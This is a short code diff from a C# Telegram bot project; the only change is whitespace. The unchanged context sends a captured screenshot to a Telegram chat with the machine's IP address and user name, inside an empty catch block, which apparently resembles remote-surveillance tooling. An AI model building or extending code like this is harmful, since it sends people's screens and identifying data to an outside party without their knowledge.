@@ -142,7 +142,7 @@ namespace TelegramBotBot
                                            chatId: e.Message.Chat.Id,
                                            document: new FileToSend(stream.Name, stream),
                                            caption: $"Screenshot! IP:{myIP} User:{Environment.UserName}"
-                                       );
+                                        );
                                     }
                             }
                             catch { }
